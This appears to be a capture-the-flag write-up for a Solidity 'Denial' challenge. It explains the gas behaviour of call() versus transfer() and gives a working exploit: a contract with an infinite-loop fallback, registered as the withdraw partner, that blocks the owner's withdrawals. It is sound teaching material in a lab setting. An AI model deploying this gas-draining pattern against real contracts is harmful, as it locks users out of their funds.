### Analysis
There are some differences between `call()` and `transfer()`.
the call() function is that it forwards all the gas along with the call unless a gas value is specified in the call. The transfer() and send() only forwards 2300 gas.

The call() returns two values, a bool success showing if the call succeeded and a bytes memory data which contains the return value. It should be noted that the return values of the external calls are not checked anywhere. When transfer is called on a smart contract, that smart contract's receive or fallback function will execute. Or, if neither of these are defined, then the function will fail. This functionality is what we'll exploit to solve this problem.

To exploit the contract and prevent the owner.transfer(amountToSend) from being called, we need to create a contract with a fallback or receive function that drains all the gas and prevents further execution of the withdraw() function.


### The Exploit
First deploy the solution contract:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract DenialSolution {
    fallback() external payable {
        while (true) {}
    }
}
~~~
Then call setWithdrawPartner to set the solution address:
~~~
await contract.setWithdrawPartner('0x000...000');  // Update to the solution address
~~~